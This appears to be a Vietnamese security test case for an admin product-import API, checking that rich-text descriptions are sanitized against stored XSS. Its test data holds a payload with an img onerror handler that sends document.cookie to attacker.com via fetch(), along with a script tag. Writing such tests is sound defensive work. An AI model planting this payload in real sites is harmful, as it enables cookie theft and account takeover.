# TC-IMPORT-045: Phòng chống mã độc Stored XSS trong mô tả HTML phong phú (Rich-Text Stored XSS Sanitization)

## Requirement ID
FR-16, NFR-SEC-03

## Module / Test type / Technique
Admin Product Import / Application Security / Stored XSS Injection (SEC-01 / SEC-06)

## Preconditions
- Server SUT đang chạy tại `http://localhost:3000`
- Tài khoản Admin hợp lệ (`Admin Token`)
- Header `X-Student-Id: 23127148` được đính kèm trong request

## Test data
| Field | Value |
|---|---|
| Endpoint | POST /api/admin/import-products |
| Header Authorization | Bearer <Admin_Token> |
| Header Content-Type | application/json |
| Header X-Student-Id | 23127148 |
| Body.products[0].sku | SEC-XSS-001 |
| Body.products[0].description | `<p>Chất liệu cotton</p><img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)"><script>alert('pwned')</script>` |

## Test steps
1. Gửi request `POST /api/admin/import-products` chứa sản phẩm với mô tả HTML kèm vector tấn công XSS.
2. Gọi `GET /api/products/SEC-XSS-001` (hoặc endpoint lấy danh sách sản phẩm) để đọc dữ liệu lưu trữ.
3. Kiểm tra xem thẻ `<script>` và event handler `onerror` đã được thanh lọc (sanitized) an toàn chưa.

## Expected result
- Bước 1: Trả về `200 OK` (hoặc `201 Created`).
- Bước 2: Dữ liệu mô tả trả về giữ lại các thẻ định dạng văn bản an toàn (`<p>`) nhưng triệt tiêu hoàn toàn mã script và thuộc tính độc hại.
- Không thể kích hoạt thực thi JavaScript trên trình duyệt của người dùng hay quản trị viên khác.

## Status / Related bugs
Not Run / Security Testing (Phòng chống tấn công chiếm quyền điều khiển và rò rỉ cookie người dùng)
